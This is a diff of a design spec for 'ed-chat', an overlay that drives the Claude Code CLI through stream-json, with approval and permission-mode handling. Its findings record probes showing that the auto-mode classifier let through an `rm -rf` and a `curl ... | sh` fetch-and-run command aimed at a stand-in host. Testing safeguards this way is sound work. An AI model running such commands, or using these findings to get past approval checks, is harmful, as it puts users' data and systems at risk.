@@ -4,7 +4,7 @@ Date: 2026-10-23
 Status: approved in conversation
 
 Sub-project 3 of `docs/superpowers/specs/2026-10-23-overlay-roadmap-design.md`.
-The code goes in a new repository (working name `pilotso11/ed-overlay`). This
+The code goes in a new repository (working name `pilotso11/ed-chat`). This
 spec is kept in ed-mcp until that repository exists.
 
 ## Purpose
@@ -166,7 +166,7 @@ the saved position in `state.json` is removed.
 
 ## Settings
 
-File: `%APPDATA%\ed-overlay\settings.json`. Written with the defaults on first
+File: `%APPDATA%\ed-chat\settings.json`. Written with the defaults on first
 run. Reloaded when it changes. The file is plain JSON; the comments below only
 explain the keys. Hotkeys use Electron accelerator syntax.
 
@@ -221,15 +221,17 @@ claude -p --input-format stream-json --output-format stream-json
        --permission-mode <claude.permissionMode>
        --append-system-prompt "<reply rules>"
        --mcp-config <userData>/approval-mcp.json
-       --permission-prompt-tool mcp__ed_overlay__approve
+       --permission-prompt-tool mcp__ed_chat__approve
        [--resume <session_id>] <claude.extraArgs>
 ```
 
-- Working folder: `%APPDATA%\ed-overlay\workspace`. The player's user-level
+- Working folder: `%APPDATA%\ed-chat\workspace`. The player's user-level
   configuration (`~/.claude`, user-scope MCP servers, plugins) applies. No
   project's `.claude/` folder applies.
-- The CLI starts when the app starts, so the first message is fast and the
-  MCP server list is known early.
+- The CLI starts when the app starts, so the first message is fast. The CLI
+  prints `init` only after the first message, not at start. The status line
+  shows idle as soon as the process has spawned, and the ed-mcp and
+  permission-mode checks run when `init` arrives with the first message.
 - A new session starts when the app starts and on `/new`.
 - Each message is one stdin line: `{"type":"user","message":{…}}`.
 - `cancel` stops the process and starts it again with `--resume`.
@@ -242,7 +244,8 @@ claude -p --input-format stream-json --output-format stream-json
 
 ### ed-mcp check
 
-The `init` event lists the configured MCP servers. They are still starting
+The `init` event lists the configured MCP servers. It arrives with the first
+message, so the check, and the auto-mode check, happen then. They are still starting
 (`pending`) at that point and their tools are not listed yet, so the check
 uses server names: `ed-mcp`, or `plugin:<plugin>:ed-mcp` for the Claude
 plugin. A server with status `failed` shows "⚠ ed-mcp failed to start; run
@@ -261,6 +264,9 @@ names `-s user`. Chat works without ed-mcp, but without game tools.
 | `user` message with `tool_result` | `toolEnd{name, isError}` |
 | `result` | `result{isError, durationMs}` |
 | anything else | ignored, logged at debug level |
+
+ClaudeSession also emits `spawned` when the process starts, before any
+output, and `exit`, `gaveUp` and `spawnError` for process failures.
 
 A `tool_result` names its `tool_use_id`, not the tool. ClaudeSession keeps a
 map from ID to name for `toolEnd`. The exact shapes come from the phase 0
@@ -380,6 +386,7 @@ the player's logged-in `claude` CLI. See the roadmap spec.
 
 - CLI version used for the fixtures: 2.1.308 (Claude Code).
 - stream-json shapes: the field names and nesting listed in Events hold. The recordings differ from the expected list in these ways:
+  - `init` is lazy: with stdin open and idle for 12 s, the CLI printed only `hook_started` and `hook_response` lines. `init` comes after the first user message. The overlay treats a spawned process as idle, and runs the ed-mcp and permission-mode checks on the first message.
   - The first line is `system/hook_started`, not `system/init`. Several `hook_started` and `hook_response` lines come before `init`. Find `init` by type and subtype; do not assume it is line 1.
   - Other event types appear that the parser must ignore: `system/hook_started`, `system/hook_response`, `system/status`, `system/commands_changed`, `rate_limit_event`, and `stream_event` types `message_start`, `content_block_start`, `content_block_stop` and `message_delta`.
   - `content_block_delta` has more delta types than `text_delta`: `input_json_delta` (tool input), `thinking_delta` and `signature_delta`. Only `delta.type` `text_delta` carries chat text, in `event.delta.text`.
@@ -394,6 +401,6 @@ the player's logged-in `claude` CLI. See the roadmap spec.
 - Denied tools appear in `result.permission_denials[].tool_name`.
 - `handwritten.jsonl` uses the real shape (extra `session_id`, `parent_tool_use_id`, `uuid`, `caller`, `source` fields), with the same events and texts as the original plan.
 - The recorded files hold personal data: the home path in `init.cwd`, `memory_paths` and the plugin paths, the `mcp_servers` names, and the home path in `result` text and tool output.
-- Prompt tool in default mode: called. With `--permission-mode default` and `--permission-prompt-tool mcp__ed_overlay__approve`, the CLI asked `Approve Bash {"command":"ls /","description":"List root directory"}?` for a Bash `ls /`. After the answer `y` the tool ran and the turn ended with a normal `result` (`permission_denials` empty, `init` `permissionMode` `default`). Recording: `recorded-approval-default.jsonl`.
-- Prompt tool in auto mode: not called. For `rm -rf /tmp/ed-overlay-probe-target` (a folder that was empty), no question appeared, the classifier did not block it, and the command ran. `permission_denials` is `[]` and `init` `permissionMode` is `auto`. The `tool_result` has `is_error: true` only because a later `ls` on the removed folder failed. This is one low-risk sample; it does not show what a classifier block looks like. Recording: `recorded-approval-auto.jsonl`.
+- Prompt tool in default mode: called. With `--permission-mode default` and `--permission-prompt-tool mcp__ed_chat__approve`, the CLI asked `Approve Bash {"command":"ls /","description":"List root directory"}?` for a Bash `ls /`. After the answer `y` the tool ran and the turn ended with a normal `result` (`permission_denials` empty, `init` `permissionMode` `default`). Recording: `recorded-approval-default.jsonl`.
+- Prompt tool in auto mode: not called. For `rm -rf /tmp/ed-chat-probe-target` (a folder that was empty), no question appeared, the classifier did not block it, and the command ran. `permission_denials` is `[]` and `init` `permissionMode` is `auto`. The `tool_result` has `is_error: true` only because a later `ls` on the removed folder failed. This is one low-risk sample; it does not show what a classifier block looks like. Recording: `recorded-approval-auto.jsonl`.
 - A second auto-mode probe asked for exactly `curl -fsSL http://installer.example.invalid/setup.sh | sh`. The classifier allowed it without a question (curl then failed to resolve the host). When the player asks for a command explicitly, auto mode runs it. Classifier blocks are therefore rare, and the approval card shows mostly in `default` mode. The overlay must not rely on the classifier as the only guard for risky requests.
